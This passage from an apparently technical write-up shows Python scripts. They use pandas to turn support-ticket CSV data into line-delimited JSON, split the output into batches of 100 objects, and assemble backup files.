class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">out</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>For <code>ticket</code>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">generate_ticket_json.py</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">""" </span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">generate_ticket_json.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> pandas </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> pd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tickets </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read_csv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'chat_data.csv'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;usecols</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">'TICKET_REQUESTER_ID'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'TICKET_CREATED_AT'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'CONVERSATION_ID'</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Remove ticket duplicates</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">removed_ticket_dups </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> tickets</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">drop_duplicates</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">subset</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"CONVERSATION_ID"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> keep</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"first"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Rename columns according to specifications</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tickets_object </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> removed_ticket_dups</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">rename</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">columns</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"CONVERSATION_ID"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"id"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"TICKET_CREATED_AT"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"created_at"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"TICKET_REQUESTER_ID"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"requester_id"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Modify column data types</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tickets_final </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> tickets_object</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">astype</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'id'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'int64'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'requester_id'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'int64'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> tickets_final</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">to_json</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orient</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'records'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lines</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">outfile</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'all_tickets_lines.json'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">outfile</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'w'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> encoding</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'utf-8'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">out</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I used the <code>DataFrame::to_json(lines=True)</code> method, option because it generated a JSON object per line. Since I knew that the requirement was to have a maximum of 100 objects per array representing the comment, user or ticket in the final JSON asset, I found it easier to split the output files (<code>all_tickets_lines.json</code>, <code>all_comments_lines.json</code>, <code>all_users_lines.json</code>) into a batch of files where each one would have 100 JSON objects within them.</p>
<p>I developed the following script to produce just that:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">split_into_batch_files.py</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">split_into_batch_files.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Define iteration group</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">assets</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">'tickets'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'users'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'comments'</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">Input JSON files</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tickets_file</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"../../{}/all_{}_lines.json"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">assets</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> assets</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">users_file</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"../../{}/all_{}_lines.json"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">assets</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> assets</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">comments_file</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"../../{}/all_{}_lines.json"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">assets</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> assets</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">### Split JSON files into smaller batches</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lines_per_file</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> asset </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> assets</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;current_file</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'../../{}/all_{}_lines.json'</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">asset</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> asset</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Splitting file '{}' into files with {} lines..."</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">lines_per_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;batch_file </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">None</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> bigfile</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> line_number</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> line </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">enumerate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">bigfile</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> line_number </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> lines_per_file </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> batch_file</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;batch_file</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">close</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;small_filename </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'./{}_split/{}.json'</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">asset</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> line_number </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> lines_per_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;batch_file </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">small_filename</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"w"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;batch_file</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">line</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> batch_file</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;batch_file</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">close</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Finished splitting file '{}'"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>After executing the script above, I had files with 100 JSON objects on each line in the file:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> ./comments_split/*.json </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token number" style="color:#36acaa">21004</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> ./tickets_split/*.json </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token number" style="color:#36acaa">925</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> ./users_split/*.json </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token number" style="color:#36acaa">138</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The final step was to iterate over each folder, read the <code>n</code>th file within that folder and insert the 100 JSON objects into an output JSON file named <code>backup_tickets_{batch_number}.json</code>.
This is the script I wrote to produce just that:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">backup_tickets.py</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> pandas </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> pd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">assets</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">'tickets'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'users'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'comments'</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">Input JSON files</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tickets_dir</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"./{}_split"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">assets</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">comments_dir</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"./{}_split"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">assets</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">users_dir</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"./{}_split"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">assets</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" 